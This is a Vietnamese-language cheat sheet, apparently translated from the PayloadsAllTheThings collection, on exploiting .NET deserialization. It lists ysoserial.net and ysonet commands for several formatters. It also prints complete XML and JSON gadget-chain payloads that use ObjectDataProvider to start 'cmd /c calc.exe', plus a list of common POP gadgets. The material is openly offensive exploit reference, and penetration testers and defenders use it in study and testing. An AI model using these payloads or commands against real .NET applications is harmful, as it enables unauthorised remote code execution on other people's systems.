# .NET Deserialization

> Serialization trong .NET là quá trình chuyển đổi trạng thái của một đối tượng thành một định dạng có thể dễ dàng lưu trữ hoặc truyền tải, chẳng hạn như XML, JSON hoặc binary. Dữ liệu đã serialize này sau đó có thể được lưu vào file, gửi qua mạng, hoặc lưu trữ trong cơ sở dữ liệu. Sau đó, nó có thể được deserialize để tái tạo lại đối tượng ban đầu cùng với dữ liệu nguyên vẹn. Serialization được sử dụng rộng rãi trong .NET cho các tác vụ như caching, truyền dữ liệu giữa các ứng dụng, và quản lý session state.

## Tóm tắt

* [Phát hiện](#detection)
* [Công cụ](#tools)
* [Formatters](#formatters)
    * [XmlSerializer](#xmlserializer)
    * [DataContractSerializer](#datacontractserializer)
    * [NetDataContractSerializer](#netdatacontractserializer)
    * [LosFormatter](#losformatter)
    * [JSON.NET](#jsonnet)
    * [BinaryFormatter](#binaryformatter)
* [POP Gadgets](#pop-gadgets)
* [Tài liệu tham khảo](#references)

## Phát hiện

| Dữ liệu           | Mô tả          |
| -------------- | -------------------- |
| `AAEAAD` (Hex) | .NET BinaryFormatter |
| `FF01` (Hex)   | .NET ViewState       |
| `/w` (Base64)  | .NET ViewState       |

Ví dụ: `AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`

## Công cụ

* [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) - Công cụ tạo payload deserialization cho nhiều loại .NET formatters khác nhau

    ```ps1
    cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
    ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
    ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
    ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
    ```

* [irsdl/ysonet](https://github.com/irsdl/ysonet) - Công cụ tạo payload deserialization cho nhiều loại .NET formatters khác nhau

    ```ps1
    cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
    ./ysonet.exe -p DotNetNuke -m read_file -f win.ini
    ./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
    ./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
    ```

## Formatters

![NETNativeFormatters.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Insecure%20Deserialization/Images/NETNativeFormatters.png?raw=true)
Các Native Formatters của .NET từ [pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15)

### XmlSerializer

* Trong mã nguồn C#, tìm `XmlSerializer(typeof(<TYPE>));`.
* Kẻ tấn công phải kiểm soát được **type** của XmlSerializer.
* Đầu ra payload: **XML**

```xml
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```

### DataContractSerializer

> DataContractSerializer thực hiện deserialize theo cách lỏng lẻo (loosely coupled). Nó không bao giờ đọc thông tin về type và assembly của common language runtime (CLR) từ dữ liệu đầu vào. Mô hình bảo mật của XmlSerializer tương tự như của DataContractSerializer, và chỉ khác nhau chủ yếu ở các chi tiết. Ví dụ, thuộc tính XmlIncludeAttribute được dùng để bao gồm type thay vì thuộc tính KnownTypeAttribute.

* Trong mã nguồn C#, tìm `DataContractSerializer(typeof(<TYPE>))`.
* Đầu ra payload: **XML**
* **Type** của dữ liệu phải do người dùng kiểm soát thì mới khai thác được

### NetDataContractSerializer

> Nó kế thừa class `System.Runtime.Serialization.XmlObjectSerializer` và có khả năng serialize bất kỳ type nào được đánh dấu bằng thuộc tính serializable giống như `BinaryFormatter`.

* Trong mã nguồn C#, tìm `NetDataContractSerializer().ReadObject()`.
* Đầu ra payload: **XML**

```ps1
.\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### LosFormatter

* Sử dụng `BinaryFormatter` bên trong.

```ps1
.\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
```

### JSON.NET

* Trong mã nguồn C#, tìm `JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings`.
* Đầu ra payload: **JSON**

```ps1
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc.exe" -t
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

### BinaryFormatter

> Kiểu BinaryFormatter rất nguy hiểm và không được khuyến khích sử dụng để xử lý dữ liệu. Các ứng dụng nên ngừng sử dụng BinaryFormatter càng sớm càng tốt, ngay cả khi họ tin rằng dữ liệu họ đang xử lý là đáng tin cậy. BinaryFormatter không an toàn và không thể được làm cho an toàn.

* Trong mã nguồn C#, tìm `System.Runtime.Serialization.Binary.BinaryFormatter`.
* Việc khai thác yêu cầu interface `[Serializable]` hoặc `ISerializable`.
* Đầu ra payload: **Binary**

```ps1
./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

## POP Gadgets

Các gadget này phải có các đặc tính sau:

* Serializable
* Có các biến public/settable
* Các "hàm" magic: Get/Set, OnSerialisation, Constructors/Destructors

Bạn phải lựa chọn cẩn thận các **gadget** phù hợp với **formatter** mục tiêu.

Danh sách các gadget phổ biến được dùng trong các payload thông dụng.

* **ObjectDataProvider** từ `C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll`
    * Dùng `MethodParameters` để thiết lập các tham số tùy ý
    * Dùng `MethodName` để gọi một hàm bất kỳ
* **ExpandedWrapper**
    * Chỉ định `object types` của các đối tượng được bao bọc bên trong

    ```cs
    ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
    ```

* **System.Configuration.Install.AssemblyInstaller**
    * Thực thi payload bằng Assembly.Load

    ```cs
    // System.Configuration.Install.AssemblyInstaller
    public void set_Path(string value){
        if (value == null){
            this.assembly = null;
        }
        this.assembly = Assembly.LoadFrom(value);
    }
    ```

## Tài liệu tham khảo

* [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - Slides - James Forshaw - September 20, 2012](https://web.archive.org/web/20120920142257/https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf)
* [ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - White Paper - James Forshaw - September 20, 2012](https://web.archive.org/web/20260216023308/https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
* [Attacking .NET Deserialization - Alvaro Muñoz - April 28, 2018](https://web.archive.org/web/20200215071108/https://youtu.be/eDfGpu3iE4Q)
* [Attacking .NET Serialization - Alvaro - October 20, 2017](https://web.archive.org/web/20250210175031/https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11)
* [Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net) - HackTricks - July 18, 2024](https://web.archive.org/web/20241130213753/https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)
* [Bypassing .NET Serialization Binders - Markus Wulftange - June 28, 2022](https://web.archive.org/web/20260228021314/https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
* [Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili (@irsdl) - April 23, 2019](https://web.archive.org/web/20230402051324/https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [Finding a New DataContractSerializer RCE Gadget Chain - dugisec - November 7, 2019](https://web.archive.org/web/20210926153917/http://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)
* [Friday the 13th: JSON Attacks - DEF CON 25 Conference - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://web.archive.org/web/20180908194356/https://www.youtube.com/watch?v=ZBfBYoK_Wr0)
* [Friday the 13th: JSON Attacks - Slides - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://web.archive.org/web/20251117062750/https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [Friday the 13th: JSON Attacks - White Paper - Alvaro Muñoz (@pwntester) and Oleksandr Mirosh - July 22, 2017](https://web.archive.org/web/20170728193005/https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
* [Now You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits - Alyssa Rahman - December 13, 2021](https://web.archive.org/web/20221130214048/https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)
* [Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237 - Shubham Shah - November 2, 2021](https://web.archive.org/web/20211103083935/https://blog.assetnote.io/2021/11/02/sitecore-rce/)
